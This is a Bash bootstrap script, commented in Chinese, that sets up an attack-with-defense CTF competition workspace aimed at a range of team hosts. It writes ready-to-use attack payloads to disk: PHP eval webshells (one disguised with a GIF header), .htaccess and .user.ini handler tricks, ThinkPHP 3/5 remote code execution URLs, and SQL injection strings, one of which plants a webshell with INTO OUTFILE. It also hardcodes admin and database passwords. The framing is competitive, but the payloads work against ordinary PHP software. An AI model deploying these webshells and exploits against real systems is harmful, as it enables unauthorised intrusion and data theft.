#!/bin/bash
# AWD 比赛启动脚本
# 用法: bash bootstrap_awd.sh NEW_PROJECT_NAME [domain_template] [team_start team_end]
# 示例:
#   bash bootstrap_awd.sh awd-2026-final "192-168-1-{TEAM}.pvp7574.bugku.cn" 1 121

set -e

PROJ_NAME="$1"
DOMAIN_TMPL="${2:-192-168-1-{TEAM}.pvp7574.bugku.cn}"
TEAM_START="${3:-1}"
TEAM_END="${4:-121}"

if [ -z "$PROJ_NAME" ]; then
    echo "Usage: $0 <NEW_PROJECT_NAME> [domain_template] [team_start team_end]"
    echo "示例: $0 awd-round2 \"192-168-1-{TEAM}.xxx.com\" 1 51"
    exit 1
fi

SRC_DIR="$(cd "$(dirname "$0")" && pwd)"
DST_DIR="$(cd "$(dirname "$0")" && pwd)/../${PROJ_NAME}"

if [ -d "$DST_DIR" ]; then
    echo "[!] 目标目录已存在: $DST_DIR"
    read -p "是否覆盖? (y/N): " -n 1 -r
    echo
    [[ ! $REPLY =~ ^[Yy]$ ]] && exit 1
    rm -rf "$DST_DIR"
fi

echo "============================================"
echo "AWD 比赛启动: $PROJ_NAME"
echo "来源: $SRC_DIR  →  目标: $DST_DIR"
echo "域名模板: $DOMAIN_TMPL ($TEAM_START-$TEAM_END)"
echo "============================================"

# --- 复制目录结构 ---
mkdir -p "$DST_DIR"
for d in attack defense tools payloads configs logs writeup classifications; do
    if [ -d "$SRC_DIR/$d" ]; then
        cp -r "$SRC_DIR/$d" "$DST_DIR/$d"
        echo "  [+] $d/"
    fi
done

# --- 复制 skill / 文档 ---
if [ -d "$SRC_DIR/.trae" ]; then
    cp -r "$SRC_DIR/.trae" "$DST_DIR/.trae"
    echo "  [+] .trae/ (技能)"
fi

# --- 创建配置文件 ---
mkdir -p "$DST_DIR/configs"
cat > "$DST_DIR/configs/competition.conf" <<EOF
# AWD 比赛配置
COMPETITION_NAME="$PROJ_NAME"
DOMAIN_TEMPLATE="$DOMAIN_TMPL"
TEAM_START=$TEAM_START
TEAM_END=$TEAM_END
FLAG_PATTERN='flag\{[^}]+\}'

# 自家靶机信息 (填写后用 defense_bootstrap.sh 加固)
SELF_TARGET=""       # user@host:port
SELF_SSH_PASS=""     # SSH 密码 (不要改!)
SELF_ADMIN_PASS="Ad#2026Admin\$ec!"

# 数据库密码
DB_USER="cms"
DB_PASS="Xy#2026Db\$ecure!"
DB_ROOT_PASS="Rt#2026Root\$ec!"
EOF
echo "  [+] configs/competition.conf (已创建)"

# --- 创建攻击结果目录 ---
mkdir -p "$DST_DIR/logs/flags" "$DST_DIR/logs/pwn" "$DST_DIR/logs/web"
mkdir -p "$DST_DIR/payloads/webshells" "$DST_DIR/payloads/rce" "$DST_DIR/payloads/sqli"

# --- 写入常用 webshell ---
cat > "$DST_DIR/payloads/webshells/shell_base.php" <<'EOF'
<?php @eval($_POST['cmd']); ?>
EOF
cat > "$DST_DIR/payloads/webshells/shell_gif.php" <<'EOF'
GIF89a<?php @eval($_POST['cmd']);?>
EOF
cat > "$DST_DIR/payloads/webshells/shell_get.php" <<'EOF'
<?php $_GET['a']($_POST['b']); ?>
EOF
cat > "$DST_DIR/payloads/webshells/htaccess.txt" <<'EOF'
AddType application/x-httpd-php .abc .xyz .pwn
<FilesMatch "\.jpg$"> SetHandler application/x-httpd-php </FilesMatch>
EOF
cat > "$DST_DIR/payloads/webshells/user_ini.txt" <<'EOF'
auto_prepend_file="shell.jpg"
auto_append_file="shell.jpg"
EOF
echo "  [+] payloads/webshells/ (已创建 5 种)"

# --- 写入 RCE payloads ---
cat > "$DST_DIR/payloads/rce/thinkphp3_rce.txt" <<'EOF'
/index.php?s=/Index/index/name/${@print(file_get_contents('/flag'))}
/index.php?s=/Index/index/name/${@print(file_get_contents('/flag.txt'))}
/index.php?s=/Index/index/name/${@system('cat /flag')}
/index.php?s=/Show/index/id/${@print(file_get_contents('/flag'))}
/index.php?s=/Article/index/id/${@print(file_get_contents('/flag'))}
/index.php?m=Home&c=Index&a=index&name=${@print(file_get_contents('/flag'))}
EOF
cat > "$DST_DIR/payloads/rce/thinkphp5_rce.txt" <<'EOF'
/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_get_contents&vars[1][]=/flag
/index.php?s=index/think\view\driver\Php/display&content=<?php system('cat /flag');?>
EOF
echo "  [+] payloads/rce/ (已创建 2 种)"

# --- 写入 SQLi payloads ---
cat > "$DST_DIR/payloads/sqli/common.txt" <<'EOF'
and 1=1-- -
and 1=2-- -
order by 10-- -
-1 union select 1,version(),database(),user(),5-- -
-1 union select 1,load_file('/flag'),3,4,5-- -
-1 union select '<?php @eval($_POST[c]);?>',2,3 into outfile '/app/upload/s.php'-- -
' and updatexml(1,concat(0x7e,version()),1)-- -
' and extractvalue(1,concat(0x7e,database()))-- -
' and sleep(5)-- -
EOF
echo "  [+] payloads/sqli/common.txt"

# --- 创建 flags.json 占位 ---
echo '{"alive":{},"flags":{}}' > "$DST_DIR/logs/flags/flags.json"

# --- 创建启动说明 ---
cat > "$DST_DIR/START_HERE.txt" <<EOF
============================================
AWD 比赛启动 - $PROJ_NAME
============================================
域名模板: $DOMAIN_TMPL  ($TEAM_START-$TEAM_END)
============================================

★ 第一步: 侦察
  cd $DST_DIR
  python3 attack/recon_template.py \
      --domain-template "$DOMAIN_TMPL" \
      --team-range $TEAM_START $TEAM_END \
      --attack --out logs/flags/flags_round1.json

★ 第二步: 加固自家靶机
  先编辑 configs/competition.conf 填写 SELF_TARGET + SELF_SSH_PASS
  然后:
  bash defense/defense_bootstrap.sh \
      "user@host:2222" "ssh_password" "Ad#2026Admin\$ec!"

★ 第三步: 持续轮询 Flag
  编辑 attack/auto_attack.py, 把 flags_round1.json 中存活的队伍填入, 然后:
  while true; do
      python3 attack/auto_attack.py > logs/flags/round_$(date +%H%M%S).json
      sleep 60
  done &

★ 第四步: Pwn 利用
  python3 tools/pwn_template.py --binary ./chall --mode ret2libc \
      --libc ./libc.so.6 --offset 72

★ 第五步: Misc 工具
  python3 tools/misc_tools.py wireshark list
  python3 tools/misc_tools.py steg-detect image.png
  python3 tools/misc_tools.py decode "SGVsbG8="
  python3 tools/misc_tools.py portscan 192.168.1.X
  python3 tools/misc_tools.py proto-attack 192.168.1.X 6379

★ 文档参考
  Skill: .trae/skills/awd-competition/SKILL.md
  分类: classifications/awd_attack_defense_classification.md
    Web:     classifications/web.md
    Pwn:     classifications/pwn.md
    Misc:    classifications/misc.md
    Crypto:  classifications/crypto.md
    Reverse: classifications/reverse.md
    Mobile:  classifications/mobile.md
    Chain:   classifications/blockchain.md

============================================
EOF
echo "  [+] START_HERE.txt"

echo ""
echo "============================================"
echo "✓ 项目已创建: $DST_DIR"
echo ""
echo "下一步:"
echo "  cd $DST_DIR"
echo "  查看 START_HERE.txt"
echo "  或直接跑侦察: python3 attack/recon_template.py --domain-template \"$DOMAIN_TMPL\" --team-range $TEAM_START $TEAM_END --attack"
echo "============================================"
